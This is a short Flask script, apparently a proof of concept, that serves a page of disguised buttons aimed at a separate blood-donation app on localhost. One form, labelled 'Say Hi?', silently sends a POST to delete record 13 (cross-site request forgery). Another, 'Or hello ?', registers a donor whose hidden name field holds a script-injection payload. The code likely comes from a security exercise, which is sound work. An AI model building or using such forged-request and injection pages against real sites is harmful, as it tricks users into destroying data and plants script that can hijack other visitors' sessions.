from flask import Flask

app = Flask(__name__)

@app.route('/')
def home ():
    return '''
<form action="http://127.0.0.1:5000/delete", method="POST">
<input type="hidden" value=13 name="id" />
<button type="submit">Say Hi?</button>
</form>
<BR />
<BR />
<form action="http://127.0.0.1:5000/register", method="POST">
<input type="hidden" value=" " name="blood_group" />
<input type="hidden" value="<script> alert('a-hello!');</script>" name="donorname" />
<input type="hidden" value=" " name="gender" />
<input type="hidden" value=" " name="qty" />
<input type="hidden" value=" " name="dweight" />
<input type="hidden" value=" " name="email" />
<input type="hidden" value=" " name="phone" />
<button type="submit">Or hello ?</button>
</form>
'''

if __name__ == '__main__':
    app.run(host="0.0.0.0", port=5001, debug=True)